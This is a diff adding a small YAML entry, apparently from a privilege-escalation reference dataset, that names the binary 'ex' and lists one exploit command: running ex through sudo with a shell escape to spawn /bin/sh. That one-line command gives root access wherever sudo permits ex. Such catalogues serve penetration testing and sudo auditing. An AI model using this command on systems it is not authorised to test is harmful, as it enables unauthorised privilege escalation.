@@ -1,0 +1,4 @@
+name: ex
+binary_path: /usr/bin/ex
+exploit_cmds:
+- sudo /usr/bin/ex -c ':!/bin/sh'
